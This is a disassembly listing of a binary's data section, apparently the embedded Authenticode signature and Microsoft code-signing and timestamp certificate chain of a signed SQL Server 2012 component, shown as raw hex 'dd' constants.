                dd 316E6F69h, 6213023h, 3045503h, 694D1A13h, 736F7263h
                dd 2074666Fh, 65646F43h, 67695320h, 676E696Eh, 41435020h
                dd 1A610A02h, 0EAF5h, 6A000000h, 5060930h, 2030E2Bh, 0A000051Ah
                dd 1930B281h, 862A0906h, 0DF78648h, 31030901h, 2B0A060Ch
                dd 1040106h, 1023782h, 61C3004h, 1062B0Ah, 37820104h, 310B0102h
                dd 60C300Eh, 1062B0Ah, 37820104h, 30150102h, 2A090623h
                dd 0F7864886h, 409010Dh, 14041631h, 8DBCA5CCh, 0AB46975Dh
                dd 76DBCB00h, 275C4A26h, 9B8BE104h, 0A065230h, 401062Bh
                dd 2378201h, 44310C01h, 20A04230h, 53001E80h, 4C005100h
                dd 53002000h, 72006500h, 65007600h, 20007200h, 30003200h
                dd 32003100h, 1C801EA1h, 70747468h, 772F2F3Ah, 6D2E7777h
                dd 6F726369h, 74666F73h, 6D6F632Eh, 6C71732Fh, 9060D30h
                dd 8648862Ah, 1010DF7h, 4000501h, 5000182h, 0B2408767h
                dd 0EA8F4CA6h, 39DB46FFh, 65C263BEh, 704C4882h, 6AC1A79Bh
                dd 0A473CDB8h, 0D44AB1DBh, 9C4A5247h, 232DC1E2h, 0B9F1E93Fh
                dd 695861F0h, 3EFCA8F9h, 6F43C73Bh, 70B73297h, 0F9A3273Fh
                dd 845C58CEh, 9C3151BDh, 0F08A04B8h, 3B2BFBB8h, 0DA394BA9h
                dd 0C28A8CA7h, 19B4F8h, 0D37F55EFh, 4C158B31h, 27F1EAACh
                dd 0EA4B2F5Dh, 2F04Ch, 0D5521A18h, 3485070h, 3C215E8Ah
                dd 0DE64A1C5h, 0EAD56280h, 6E9A61EDh, 0D99455B7h, 64B75002h
                dd 0ABC9B514h, 4E4A8F78h, 0BC578B25h, 0EF0819A6h, 6DF9E742h
                dd 35ABD778h, 7C155F4Ah, 7FA410BDh, 0D795A3AAh, 3A2D7165h
                dd 385A5DB9h, 445A2D3Ah, 7E5EABD2h, 92FF92h, 3ED8F5ACh
                dd 7F6EDFD2h, 9ABEEC51h, 236D0675h, 936727BEh, 26185116h
                dd 5EA9EBD2h, 26815196h, 0B3445751h, 869EBB5Ch, 0AE4E99A9h
                dd 0E9C36ACh, 0BCC23BF7h, 0A16A826Eh, 30752382h, 6190282h
                dd 48862A09h, 10DF786h, 82310609h, 82300A02h, 1020602h
                dd 85813001h, 0B317730h, 3060930h, 13060455h, 31535502h
                dd 6113013h, 8045503h, 61570A13h, 6E696873h, 6E6F7467h
                dd 0E301031h, 4550306h, 52071307h, 6F6D6465h, 1E31646Eh
                dd 3061C30h, 130A0455h, 63694D15h, 6F736F72h, 43207466h
                dd 6F70726Fh, 69746172h, 21316E6Fh, 3061F30h, 13030455h
                dd 63694D18h, 6F736F72h, 54207466h, 2D656D69h, 6D617453h
                dd 43502070h, 610A0241h, 961905h, 0
                dd 607301Bh, 30E2B05h, 5DA01A02h, 9061830h, 8648862Ah
                dd 9010DF7h, 60B3103h, 48862A09h, 10DF786h, 1C300107h
                dd 862A0906h, 0DF78648h, 31050901h, 310D170Fh, 31323032h
                dd 31383131h, 5A313134h, 9062330h, 8648862Ah, 9010DF7h
                dd 4163104h, 0A0240014h, 5A4EE1FEh, 0EA02641Dh, 42B52712h
                dd 0EEB15461h, 60D30F6h, 48862A09h, 10DF786h, 50501h, 18204h
                dd 0BDBF29Fh, 78031D4Ch, 0DA4992FDh, 0E68604CFh, 807DC9B2h
                dd 0CCFBCF8Ch, 0D863E612h, 0A704E4A3h, 6A401797h, 28B1581h
                dd 29A91F65h, 2F5F65E8h, 0C131C171h, 20E86227h, 37350D82h
                dd 0D4CCEC61h, 7CE7F6CFh, 7FF92C5Eh, 0C9FB3377h, 0FDB29399h
                dd 717826C8h, 74167DEAh, 25922538h, 4B2AF548h, 78242F3Fh
                dd 0F0C4ABEDh, 608BB218h, 65AC872Eh, 5898B8BFh, 0CFF58456h
                dd 463BBDD4h, 3C924553h, 1E414DEFh, 743B856Bh, 0E49F593Fh
                dd 66F2BE6Bh, 0B4E7721Eh, 0BB3C2DBEh, 0F8B083E2h, 81F7E03Dh
                dd 71F1C121h, 0D62A7E21h, 8529BCD4h, 0DCB750E3h, 0C8BBC0B9h
                dd 1DAA07h, 80809927h, 0E1FE47C1h, 0CBFEA6EEh, 2AD1448Eh
                dd 776D5595h, 98D499DBh, 0F562CFEBh, 5FA0C79Ch, 0FA4BF571h
                dd 24994D19h, 1B352059h, 286AC451h, 0B48721AFh, 5F9F669Dh
                dd 0C25B3745h, 0DEB9F5CDh, 5F4D8D45h, 7915E664h, 54218230h
                dd 62B0A06h, 82010401h, 1040237h, 44218231h, 40218230h
                dd 862A0906h, 0DF78648h, 0A0020701h, 30312182h, 22D2182h
                dd 0F310101h, 9060D30h, 1488660h, 2040365h, 30000501h
                dd 2B0A065Ch, 1040106h, 1023782h, 304EA004h, 617304Ch
                dd 1062B0Ah, 37820104h, 300F0102h, 10309h, 2A204A0h, 31300080h
                dd 9060D30h, 1488660h, 2040365h, 4000501h, 0BFAAAF20h
                dd 7BD91F36h, 75B541D9h, 7BF33617h, 0B57AAD4Fh, 0AF7E58B1h
                dd 0C670F808h, 2E242B85h, 0B82A099h, 482301Bh, 38230A3h
                dd 203A08Bh, 0A020201h, 55490561h, 0
                dd 0D300B00h, 862A0906h, 0DF78648h, 50B0101h, 317E3000h
                dd 609300Bh, 6045503h, 53550213h, 11301331h, 4550306h
                dd 570A1308h, 69687361h, 6F74676Eh, 3010316Eh, 5503060Eh
                dd 7130704h, 6D646552h, 31646E6Fh, 61C301Eh, 0A045503h
                dd 694D1513h, 736F7263h, 2074666Fh, 70726F43h, 7461726Fh
                dd 316E6F69h, 6263028h, 3045503h, 694D1F13h, 736F7263h
                dd 2074666Fh, 65646F43h, 67695320h, 676E696Eh, 41435020h
                dd 31303220h, 171E3030h, 3131310Dh, 32303130h, 32353430h
                dd 0D175A34h, 31303331h, 30323031h, 34323535h, 8381305Ah
                dd 9300B31h, 4550306h, 55021306h, 30133153h, 55030611h
                dd 0A130804h, 68736157h, 74676E69h, 10316E6Fh, 3060E30h
                dd 13070455h, 64655207h, 646E6F6Dh, 1C301E31h, 4550306h
                dd 4D15130Ah, 6F726369h, 74666F73h, 726F4320h, 61726F70h
                dd 6E6F6974h, 0B300D31h, 4550306h, 4D04130Bh, 3152504Fh
                dd 61C301Eh, 3045503h, 694D1513h, 736F7263h, 2074666Fh
                dd 70726F43h, 7461726Fh, 306E6F69h, 30220182h, 2A09060Dh
                dd 0F7864886h, 101010Dh, 82030005h, 30000F01h, 20A0182h
                dd 10182h, 3130A4CFh, 86165181h, 34CC55E5h, 4596B660h
                dd 0EF2B5F29h, 0D6D2A408h, 0CEF32B17h, 72E5B005h, 0EDCCA443h
                dd 1E3B5C9Bh, 2AE911E4h, 719CFD59h, 2C207872h, 81381A9Bh
                dd 0A45B8B1Eh, 0E4FDF362h, 7DF8C806h, 0AFD4B18Dh, 0EBBA0761h
                dd 399F44E8h, 93B2CEAAh, 4BFD54DCh, 4F4426E0h, 0EFF8F057h
                dd 6A4A1A23h, 0F414E603h, 36A9D8E9h, 0AD1477AEh, 0E6F5F0BCh
                dd 0F2F034DAh, 27B4FCAh, 0FED45FB0h, 93B8750Fh, 67F7D39h
                dd 529D618Fh, 0C6129EE4h, 0F3C886B2h, 0D63A067Eh, 3D94C878h
                dd 0BF8847C7h, 72C61627h, 0FFCF8F83h, 0E457709Eh, 6DBB830h
                dd 0CE632711h, 96281561h, 97877F96h, 6462BBD0h, 228B4002h
                dd 0B95E2BBEh, 727701A3h, 7C4ED3E7h, 7E551302h, 5C06C0C0h
                dd 407EA9A6h, 74DD36EEh, 2457AF64h, 90F658B3h, 67559E6Bh
                dd 90B85A18h, 2EC7DAEAh, 0AA69B4E3h, 25DBB93Bh, 0FBD603E1h
                dd 10302h, 182A301h, 182301Bh, 6133017h, 251D5503h, 0A300C04h
                dd 62B0806h, 7050501h, 1D300303h, 1D550306h, 416040Eh
                dd 0B2F86914h, 0B9FA31F7h, 71831862h, 0E2A8FB58h, 78D8F9C2h
                dd 61F3061h, 231D5503h, 16301804h, 0FCE61480h, 22BB7B5Fh
                dd 72E45800h, 21F4B54Eh, 0E6322374h, 5630ACEFh, 1D550306h
                dd 304F041Fh, 0A04B304Dh, 8647A049h, 74746845h, 2F2F3A70h
                dd 2E6C7263h, 7263696Dh, 666F736Fh, 6F632E74h, 6B702F6Dh
                dd 72632F69h, 72702F6Ch, 6375646Fh, 4D2F7374h, 6F436369h
                dd 67695364h, 5F414350h, 30313032h, 2D37302Dh, 632E3630h
                dd 5A306C72h, 62B0806h, 7050501h, 4E040101h, 4A304C30h
                dd 62B0806h, 7050501h, 3E860230h, 70747468h, 772F2F3Ah
                dd 6D2E7777h, 6F726369h, 74666F73h, 6D6F632Eh, 696B702Fh
                dd 7265632Fh, 4D2F7374h, 6F436369h, 67695364h, 5F414350h
                dd 30313032h, 2D37302Dh, 632E3630h, 0C307472h, 1D550306h
                dd 0FF010113h, 300204h, 9060D30h, 8648862Ah, 1010DF7h
                dd 300050Bh, 10182h, 0E05B8A78h, 7D236D5Ah, 909B0975h
                dd 0CAFA8017h, 0AA279D6Ah, 8592D345h, 864EBCEFh, 0A7C4BCBCh
                dd 85DDB965h, 0B84A0CD8h, 0FF095A6h, 41785387h, 0A430880Ah
                dd 165420B1h, 0A1141E16h, 59B32716h, 38C568B4h, 3F2E1DB0h
                dd 0C369BF10h, 0C83FE4Ch, 784C989Dh, 50BB960Ah, 924D3AB4h
                dd 2B3F03F2h, 0C8CB9395h, 4D3D52D9h, 26196B18h, 6A5CFD5Ah
                dd 0F7AE4B40h, 2831D4E1h, 54EA7CC8h, 70D7A1A9h, 5980763Fh
                dd 0DA10D01Ah, 1AF6FEF7h, 8A30059Fh, 6DBAC06Eh, 240C2EFDh
                dd 524D3958h, 0D9E46A6Ch, 8008DF06h, 8D53415Bh, 54C1027Bh
                dd 0C2CB0D31h, 4405A4E8h, 41C78510h, 7E05BBF9h, 69848252h
                dd 0E332633Fh, 3857DF4Bh, 0C25888AEh, 0D1EED497h, 2DEF6340h
                dd 7CB06B6Dh, 0FC3B912Bh, 8ABA42E8h, 7C5102Bh, 8D40C739h
                dd 512211D2h, 0A041B870h, 0AF6011Dh, 82FC6019h, 0A9C7B026h
                dd 85D8DF63h, 70068230h, 58048230h, 10203A0h, 610A0202h
                dd 4C520Ch, 0
                dd 60D3003h, 48862A09h, 10DF786h, 50B01h, 31888130h, 609300Bh
                dd 6045503h, 53550213h, 11301331h, 4550306h, 570A1308h
                dd 69687361h, 6F74676Eh, 3010316Eh, 5503060Eh, 7130704h
                dd 6D646552h, 31646E6Fh, 61C301Eh, 0A045503h, 694D1513h
                dd 736F7263h, 2074666Fh, 70726F43h, 7461726Fh, 316E6F69h
                dd 6303032h, 3045503h, 694D2913h, 736F7263h, 2074666Fh
                dd 746F6F52h, 72654320h, 69666974h, 65746163h, 74754120h
                dd 69726F68h, 32207974h, 30303130h, 310D171Eh, 30373030h
                dd 34303236h, 5A373130h, 35320D17h, 36303730h, 30353032h
                dd 305A3731h, 300B317Eh, 55030609h, 2130604h, 13315355h
                dd 3061130h, 13080455h, 7361570Ah, 676E6968h, 316E6F74h
                dd 60E3010h, 7045503h, 65520713h, 6E6F6D64h, 301E3164h
                dd 5503061Ch, 15130A04h, 7263694Dh, 666F736Fh, 6F432074h
                dd 726F7072h, 6F697461h, 3028316Eh, 55030626h, 1F130304h
                dd 7263694Dh, 666F736Fh, 6F432074h, 53206564h, 696E6769h
                dd 5020676Eh, 32204143h, 30303130h, 30220182h, 2A09060Dh
                dd 0F7864886h, 101010Dh, 82030005h, 30000F01h, 20A0182h
                dd 10182h, 50640EE9h, 0C4B56779h, 9FDE3h, 0AC949E4Ch, 0EA6856F7h
                dd 0C5CFD844h, 0A5A94F58h, 456D7C76h, 9239D3BAh, 0F91EA4B4h
                dd 0E48265F9h, 0FD8FD217h, 0E8089C44h, 2CCE9365h, 7DBF8455h
                dd 2B2EE308h, 182B41A8h, 6E4BA2B7h, 156B4C49h, 0D2D1DE07h
                dd 711E89C2h, 7FB5CD94h, 8AFB44Bh, 0D688CCD8h, 3A94176Bh
                dd 3F26CE93h, 34FEE6ECh, 1DD55798h, 0B2F6495Dh, 85D52E2Ah
                dd 0F83F59BBh, 832BB490h, 0B32BCA74h, 0F0E3463Bh, 17C14946h
                dd 1CC95466h, 55C41DBDh, 0F8725762h, 2025B967h, 0A65DDE34h
                dd 0AB5E95A5h, 0D5CD8028h, 3E59EB2h, 0B2D363B5h, 0C8C1C814h
                dd 590A268Ah, 0FFEC077Fh, 1280ED0Eh, 0A6124C35h, 0F55B52BEh
                dd 8BE0DAA6h, 0D677480Bh, 10D54785h, 0AAE8C6B9h, 2D6A8BEEh
                dd 0C6605C05h, 9C5B2AB4h, 455F1C23h, 1E141AE3h, 19CB376Fh
                dd 896A8033h, 666AA34Dh, 0D5937863h, 1F95CF30h, 10302h
                dd 182A301h, 18230E3h, 61030DFh, 1062B09h, 37820104h, 3040115h
                dd 30000102h, 5503061Dh, 16040E1Dh, 0FCE61404h, 22BB7B5Fh
                dd 72E45800h, 21F4B54Eh, 0E6322374h, 1930ACEFh, 62B0906h
                dd 82010401h, 4021437h, 0A1E0Ch, 750053h, 430062h, 60B3041h
                dd 0F1D5503h, 2030404h, 0F308601h, 1D550306h, 0FF010113h
                dd 3300504h, 30FF0101h, 5503061Fh, 1804231Dh, 14801630h
                dd 0CB56F6D5h, 5CA2E88Fh, 3DD16862h, 0D75B9094h, 0C4189ACEh
                dd 3065630h, 41F1D55h, 304D304Fh, 0A049A04Bh, 68458647h
                dd 3A707474h, 72632F2Fh, 696D2E6Ch, 736F7263h, 2E74666Fh
                dd 2F6D6F63h, 2F696B70h, 2F6C7263h, 646F7270h, 73746375h
                dd 63694D2Fh, 436F6F52h, 75417265h, 30325F74h, 302D3031h
                dd 33322D36h, 6C72632Eh, 8065A30h, 501062Bh, 1010705h
                dd 4C304E04h, 8064A30h, 501062Bh, 2300705h, 74683E86h
                dd 2F3A7074h, 7777772Fh, 63696D2Eh, 6F736F72h, 632E7466h
                dd 702F6D6Fh, 632F696Bh, 73747265h, 63694D2Fh, 436F6F52h
                dd 75417265h, 30325F74h, 302D3031h, 33322D36h
byte_10000      db 2Eh                  ; DATA XREF: CODE:00008E9C↑o
                                        ; CODE:00008EB4↑o ...
byte_10001      db 63h, 72h, 74h        ; DATA XREF: sub_1647D+7D↓o
                dd 69D8130h, 201D5503h, 30958104h, 81309281h, 2B09068Fh
                dd 1040106h, 32E3782h, 30818130h, 2B08063Dh, 5050106h
                dd 16010207h, 74746831h, 2F2F3A70h, 2E777777h, 7263696Dh
                dd 666F736Fh, 6F632E74h, 4B502F6Dh, 6F642F49h, 432F7363h
                dd 642F5350h, 75616665h, 682E746Ch, 40306D74h, 62B0806h
                dd 7050501h, 34300202h, 1D20321Eh, 65004C00h, 61006700h
                dd 5F006C00h, 6F005000h, 69006C00h, 79006300h, 53005F00h
                dd 61007400h, 65007400h, 65006D00h, 74006E00h, 1D202E00h
                dd 9060D30h, 8648862Ah, 1010DF7h, 300050Bh, 10282h, 57EF741Ah
                dd 0C47B294Fh, 0B8788516h, 0FC22D350h, 82AC9D09h, 0FF34F897h
                dd 95972C2Ah, 0BFE4E512h, 0C893BFCFh, 0DBA934E3h, 1EDCB881h
                dd 35D2BE00h, 7FE5AF6Fh, 0E5779579h, 0EBF1D402h, 1E4ECDD8h
                dd 0C2A2611Bh, 0F01A235Ah, 5162A88Ch, 0E3086745h, 931E3C3Fh
                dd 178530F8h, 0A64039C8h, 21B30ED7h, 0A1A5E529h, 93228C69h
                dd 0E79874CCh, 0F24347A1h, 0FC0AC53h, 0FE7F6930h, 6D2025D2h
                dd 0DFD3616Fh, 72D9D507h, 86692C00h, 0DB513D76h, 0C94839A6h
                dd 76D6137h, 0CB1953DDh, 0C261D6A7h, 0AB83E2BFh, 9B6BE00Fh
                dd 287DD695h, 4A89B051h, 6C9AA451h, 4A1FB7C8h, 0A9690E1Ah
                dd 7EC1DCD7h, 0AA7049D1h, 72BBADB6h, 0FA176347h, 0A6A2D6A6h
                dd 10A8EC86h, 0B6639B44h, 68969B2h, 7A8646C7h, 0C5E83F18h
                dd 7BD5211Dh, 2D2302F9h, 0BFCB41C5h, 16C84C1Dh, 7F9CB1EFh
                dd 494B22FCh, 0E3156E8Ah, 5B767FA6h, 917953D1h, 0D2D59D85h
                dd 35733DDBh, 54AE3CF3h, 6A4752B2h, 9513AAC0h, 0DA118ED2h
                dd 325E6799h, 8537FB8Ch, 8575DCD1h, 5AC6879Ch, 0BFC28557h
                dd 8C8F0DDDh, 0B4EB2D9Bh, 0D327CFEEh, 0FA695EB5h, 10416A4h
                dd 736724A7h, 0B64F4DCFh, 975605DEh, 52E9F77Ah, 577F44Dh
                dd 0D8C6854Fh, 0ED8EF10Bh, 0DD10942h, 5623E376h, 36262278h
                dd 8CB1CABEh, 0E41DAA6Eh, 3347DA85h, 0C9A48F62h, 715F3391h
                dd 98AF401Eh, 0E822C965h, 8A252142h, 0D9602D1Ch, 89418937h
                dd 0D70F162Ah, 68943C61h, 0D6EF5260h, 80A09947h, 8115EE40h
                dd 0E09C3E77h, 501A1853h, 9B95381Dh, 1333661Eh, 78173927h
                dd 4ECE3687h, 0F5B25FC3h, 0B653473Dh, 0BDBE5E0h, 0D72A3D61h
                dd 37CE2C92h, 42403E5Ah, 101FA431h, 9C56C208h, 515D24BFh
                dd 796A9D02h, 0DAD317D2h, 78E94C1h, 4471257Bh, 0E66A06ABh
                dd 23DFC6D4h, 0C575969Ah, 98158231h, 94158230h, 30010102h
                dd 7E308C81h, 9300B31h, 4550306h, 55021306h, 30133153h
                dd 55030611h, 0A130804h, 68736157h, 74676E69h, 10316E6Fh
                dd 3060E30h, 13070455h, 64655207h, 646E6F6Dh, 1C301E31h
                dd 4550306h, 4D15130Ah, 6F726369h, 74666F73h, 726F4320h
                dd 61726F70h, 6E6F6974h, 26302831h, 4550306h, 4D1F1303h
                dd 6F726369h, 74666F73h, 646F4320h, 69532065h, 6E696E67h
                dd 43502067h, 30322041h, 0A023031h, 55490561h, 0
                dd 0D300B00h, 86600906h, 3650148h, 5010204h, 0D181A000h
                dd 0A061130h, 8648862Ah, 9010DF7h, 3310419h, 30010102h
                dd 2A090619h, 0F7864886h, 309010Dh, 0A060C31h, 401062Bh
                dd 2378201h, 1C300401h, 62B0A06h, 82010401h, 0B010237h
                dd 0C300E31h, 62B0A06h, 82010401h, 15010237h, 9062F30h
                dd 8648862Ah, 9010DF7h, 4223104h, 320E8820h, 0A7C6F4A8h
                dd 0C8D330DDh, 989C0A35h, 0D04E37B7h, 0B9AFD1B5h, 14EC2240h
                dd 7AD0D97h, 65230E2h, 1062B0Ah, 37820104h, 310C0102h
                dd 0A0423044h, 1E8020h, 510053h, 20004Ch, 650053h, 760072h
                dd 720065h, 320020h, 310030h, 801EA132h, 7474681Ch, 2F2F3A70h
                dd 2E777777h, 7263696Dh, 666F736Fh, 6F632E74h, 71732F6Dh
                dd 60D306Ch, 48862A09h, 10DF786h, 50101h, 18204h, 10777567h
                dd 0C4A10616h, 1BF78CB3h, 0AD82BC7Bh, 320B4E8Ch, 4D7A216h
                dd 568A9279h, 15521AA5h, 0AD0FECACh, 4672C3C6h, 0BDA62AF1h
                dd 6058BA7Eh, 4C238604h, 811E33CFh, 7773FCEh, 7F8FD257h
                dd 7F0354B8h, 7E63706Dh, 0FD07AEE3h, 6F3FAEFBh, 0B2A3DED2h
                dd 28A4AE35h, 0F0499F20h, 0C55D2BD8h, 42CBA97Ch, 0AC296C57h
                dd 1773BB56h, 2078F08Ch, 1661675Bh, 7073ACDFh, 16D5649Dh
                dd 73E6C250h, 58254E39h, 5C9BE1A9h, 0B06D9B67h, 0EFFDD1C1h
                dd 0E02F062Ch, 9A489224h, 0BD1CE9Bh, 551F6425h, 2BE20DDDh
                dd 7E653A63h, 0A4D5AF96h, 8C70E952h, 1CE38329h, 3CE567h
                dd 0C2155683h, 4E3B367Fh, 4A999802h, 3DCD6276h, 0AFDB9380h
                dd 21060E54h, 89B45F5Bh, 0FA445FBAh, 90A8ADFBh, 0F7AFA39Fh
                dd 49176FCFh, 9D3519DFh, 7C323F2Ah, 24D28459h, 0D395B541h
                dd 0C46A5C58h, 35D2B33Ch, 0D52A925Ah, 81382A1h, 4138230h
                dd 62B0A06h, 82010401h, 1030337h, 0F4128231h, 0F0128230h
                dd 862A0906h, 0DF78648h, 0A0020701h, 30E11282h, 2DD1282h
                dd 0B310301h, 5060930h, 2030E2Bh, 3000051Ah, 62A0182h
                dd 48862A0Bh, 10DF786h, 4011009h, 190182A0h, 15018204h
                dd 11018230h, 6010102h, 1062B0Ah, 59840104h, 3001030Ah
                dd 6093021h, 30E2B05h, 51A02h, 38131404h, 7A5A03B2h, 0C86FE0B3h
                dd 0AFD1A2CEh, 96D2F732h, 6026D7Eh, 2226314Fh, 13183A58h
                dd 32313032h, 31313230h, 34313831h, 372E3231h, 305A3133h
                dd 1028004h, 0B981A0F4h, 30B681A4h, 0B31B381h, 3060930h
                dd 13060455h, 31535502h, 6113013h, 8045503h, 61570A13h
                dd 6E696873h, 6E6F7467h, 0E301031h, 4550306h, 52071307h
                dd 6F6D6465h, 1E31646Eh, 3061C30h, 130A0455h, 63694D15h
                dd 6F736F72h, 43207466h, 6F70726Fh, 69746172h, 0D316E6Fh
                dd 3060B30h, 130B0455h, 504F4D04h, 30273152h, 55030625h
                dd 1E130B04h, 7069436Eh, 20726568h, 20455344h, 3A4E5345h
                dd 43363339h, 4541372Dh, 34372D45h, 25314541h, 3062330h
                dd 13030455h, 63694D1Ch, 6F736F72h, 54207466h, 2D656D69h
                dd 6D617453h, 65532070h, 63697672h, 0E82A065h, 68230C4h
                dd 4823071h, 203A059h, 0A020201h, 2A810961h, 0
                dd 0D300200h, 862A0906h, 0DF78648h, 50B0101h, 88813000h
                dd 9300B31h, 4550306h, 55021306h, 30133153h, 55030611h
                dd 0A130804h, 68736157h, 74676E69h, 10316E6Fh, 3060E30h
                dd 13070455h, 64655207h, 646E6F6Dh, 1C301E31h, 4550306h
                dd 4D15130Ah, 6F726369h, 74666F73h, 726F4320h, 61726F70h
                dd 6E6F6974h, 30303231h, 4550306h, 4D291303h, 6F726369h
                dd 74666F73h, 6F6F5220h, 65432074h, 66697472h, 74616369h
                dd 75412065h, 726F6874h, 20797469h, 30313032h, 0D171E30h
                dd 37303031h, 31323130h, 35353633h, 320D175Ah, 30373035h
                dd 34313231h, 5A353536h, 0B317C30h, 3060930h, 13060455h
                dd 31535502h, 6113013h, 8045503h, 61570A13h, 6E696873h
                dd 6E6F7467h, 0E301031h, 4550306h, 52071307h, 6F6D6465h
                dd 1E31646Eh, 3061C30h, 130A0455h, 63694D15h, 6F736F72h
                dd 43207466h, 6F70726Fh, 69746172h, 26316E6Fh, 3062430h
                dd 13030455h, 63694D1Dh, 6F736F72h, 54207466h, 2D656D69h
                dd 6D617453h, 43502070h, 30322041h, 82303031h, 0D302201h
                dd 862A0906h, 0DF78648h, 5010101h, 1820300h, 8230000Fh
                dd 82020A01h, 0A9000101h, 77BC0D1Dh, 203A8A11h, 9713FCECh
                dd 697FFAF5h, 54746B94h, 0AA5D510h, 0FB858200h, 4B687CEDh
                dd 0C3C55F2Ch, 76C261E5h, 2B663EB7h, 5315F05Bh, 1F310427h
                dd 951A1B41h, 1309CE1Dh, 30617C8Eh, 4430B159h, 8860F10Fh
                dd 0C435484h, 38B84DD7h, 0DD42B308h, 73D6AC93h, 82265730h
                dd 0D00D45A3h, 8147F5EAh, 6024BFCDh, 46605832h, 864758F2h
                dd 741E8432h, 5F916761h, 0CFB15481h, 0C1924C93h, 0D15DA6C4h
                dd 286E1361h, 86F91AC6h, 61DFBB80h, 27C146FCh, 1267241Dh
                dd 8A211A72h, 89644BAFh, 5DB16250h, 3D1F77FDh, 0AC7557F0h
                dd 4D428ABDh, 0FD15140h, 673E069Ch, 0C066F57Fh, 7E449603h
                dd 0FD4BD0EFh, 0CA9AE56Eh, 7AF2A8B1h, 0F0310A2Ah, 91064EDAh
                dd 350888B6h, 0B01C78E8h, 3CCD99E9h, 0BA442FE7h, 64DCF4A7h
                dd 0C101A4BDh, 78930920h, 0C0BCFCCDh, 5E5D44C9h, 5019C16h
                dd 24D224Fh, 1000103h, 0E60182A3h, 0E2018230h, 9061030h
                dd 401062Bh, 15378201h, 2030401h, 1D300001h, 1D550306h
                dd 416040Eh, 3A63D514h, 90318A5Ch, 7C7B43F3h, 33C51B46h
                dd 6D855A68h, 6193055h, 1062B09h, 37820104h, 0C040214h
                dd 53000A1Eh, 62007500h, 41004300h, 3060B30h, 40F1D55h
                dd 1020304h, 60F3086h, 131D5503h, 4FF0101h, 1033005h, 1F30FF01h
                dd 1D550306h, 30180423h, 0D5148016h, 8FCB56F6h, 625CA2E8h
                dd 943DD168h, 0CED75B90h, 30C4189Ah, 55030656h, 4F041F1Dh
                dd 4B304D30h, 47A049A0h, 74684586h, 2F3A7074h, 6C72632Fh
                dd 63696D2Eh, 6F736F72h, 632E7466h, 702F6D6Fh, 632F696Bh
                dd 702F6C72h, 75646F72h, 2F737463h, 5263694Dh, 65436F6Fh
                dd 74754172h, 3130325Fh, 36302D30h, 2E33322Dh, 306C7263h
                dd 2B08065Ah, 5050106h, 4010107h, 304C304Eh, 2B08064Ah
                dd 5050106h, 86023007h, 7474683Eh, 2F2F3A70h, 2E777777h
                dd 7263696Dh, 666F736Fh, 6F632E74h, 6B702F6Dh, 65632F69h
                dd 2F737472h, 5263694Dh, 65436F6Fh, 74754172h, 3130325Fh
                dd 36302D30h, 2E33322Dh, 30747263h, 306A081h, 1201D55h
                dd 8104FF01h, 92813095h, 68F8130h, 1062B09h, 37820104h
                dd 8130032Eh, 63D3081h, 1062B08h, 2070505h, 68311601h
                dd 3A707474h, 77772F2Fh, 696D2E77h, 736F7263h, 2E74666Fh
                dd 2F6D6F63h, 2F494B50h, 73636F64h, 5350432Fh, 6665642Fh
                dd 746C7561h, 6D74682Eh, 8064030h, 501062Bh, 2020705h
                dd 321E3430h, 4C001D20h, 67006500h, 6C006100h, 50005F00h
                dd 6C006F00h, 63006900h, 5F007900h, 74005300h, 74006100h
                dd 6D006500h, 6E006500h, 2E007400h, 0D301D20h, 862A0906h
                dd 0DF78648h, 50B0101h, 2820300h, 0E6070001h, 0E20D5188h
                dd 3F98E0C6h, 3D037181h, 21A1A39Dh, 0A6EBB36Fh, 0BE31F5CCh
                dd 0A9E205CFh, 6D57FAFEh, 0C2B33019h, 6AC966C5h, 0F0E7F5DFh
                dd 0A8C7BD78h, 0F9E3259Eh, 546BEDBCh, 512B0857h, 0FB124482h
                dd 0CC8C53B9h, 8A1260F4h, 4040CC76h, 5CDC9B41h, 0F95CFF17h
                dd 9835175Eh, 744B5624h, 0C81042EFh, 0C67FBFAFh, 7D37F27Fh
                dd 0F21C3F5Ah, 914A7999h, 38AF0052h, 2FF5170Fh, 0D9658179h
                dd 0E46BB5A9h, 0CAF6CEC7h, 4B6F007Ah, 22244430h, 3EDCF3Ch
                dd 598F96A5h, 0FDB6BC29h, 9F70E104h, 0FD274A32h, 0FE2FAF55h
                dd 338EE5B6h, 9A5F62BBh, 0E94057DBh, 6699CEF1h, 6AFF8C90h
                dd 0C5DD7F62h, 26910B4Ah, 19EC39E2h, 9D63714Ah, 0C36D217Bh
                dd 3CA2A39Ch, 967D7FFAh, 0A678906Ah, 9CE1D26Dh, 38FC1DF9h
                dd 0C6F494D8h, 86960AA5h, 1A9EBDA4h, 834204AEh, 9B80B5B8h
                dd 0B5203822h, 0EC64E525h, 7EBFF4F7h, 0F255963h, 57392E7Ah
                dd 0AA71A276h, 890F8A06h, 0A761BA16h, 0D89ACB11h, 809A470Eh
                dd 0A7CDD0C5h, 837DEFD0h, 713BE1F0h, 745DDF09h, 61082298h
                dd 1E50B0DAh, 0E1F1BD6Fh, 31E7DF00h, 3A93A407h, 784765F7h
                dd 48A8F8E8h, 72DEF7ABh, 6F6B617Eh, 0CB81A977h, 39AC09A7h
                dd 0CBC6ECBBh, 72B482D8h, 0B8F41DCDh, 801E0185h, 2A891BFBh
                dd 5BB23954h, 550DC8DAh, 73877A99h, 98E6083Bh, 0E08DEA2Dh
                dd 29122E33h, 542FC0F5h, 0C8F72127h, 28DA4EACh, 0DBA9B1B8h
                dd 42A7B296h, 19CFC9A2h, 86E04D41h, 0A39A2AF9h, 0D3306611h
                dd 4B3274BBh, 0F57B63DFh, 1B2F8A99h, 59AF21C7h, 44DCAEB5h
                dd 7150973Ch, 0C5D2A1D7h, 0DE69E355h, 0DED1C157h, 0CCFDC030h
                dd 0DFB4DE6h, 0E94F5DBFh, 38191E9Dh, 58CFBC2Fh, 0DEF2E05h
                dd 0DA3550A0h, 1C2709EFh, 357EB3D5h, 0DABA081Eh, 5FD3DB36h
                dd 8874DE8Fh, 82301249h, 8230D104h, 3A0B903h, 2020102h
                dd 4E07610Ah, 0AAh, 30090000h, 2A09060Dh, 0F7864886h, 0B01010Dh
                dd 7C300005h, 9300B31h, 4550306h, 55021306h, 30133153h
                dd 55030611h, 0A130804h, 68736157h, 74676E69h, 10316E6Fh
                dd 3060E30h, 13070455h, 64655207h, 646E6F6Dh, 1C301E31h
                dd 4550306h, 4D15130Ah, 6F726369h, 74666F73h, 726F4320h
                dd 61726F70h, 6E6F6974h, 24302631h, 4550306h, 4D1D1303h
                dd 6F726369h, 74666F73h, 6D695420h, 74532D65h, 20706D61h
